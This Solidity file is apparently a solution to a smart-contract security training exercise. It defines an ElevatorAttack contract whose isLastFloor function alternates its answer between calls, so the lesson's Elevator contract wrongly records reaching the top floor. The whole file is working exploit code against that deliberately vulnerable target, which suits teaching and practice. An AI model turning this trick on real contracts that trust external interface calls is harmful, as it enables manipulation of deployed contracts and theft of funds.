// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../lessons/11-Elevator.sol";

contract ElevatorAttack is Building {
    Elevator elevator;
    uint256 public count;

    constructor(address _elevatorAddress) public {
        elevator = Elevator(_elevatorAddress);
        count = 0;
    }

    function isLastFloor(uint256) external override returns (bool) {
        if (count % 2 == 0) {
            count++;
            return false;
        }
        count++;
        return true;
    }

    function goTo(uint256 _floor) public {
        elevator.goTo(_floor);
    }
}
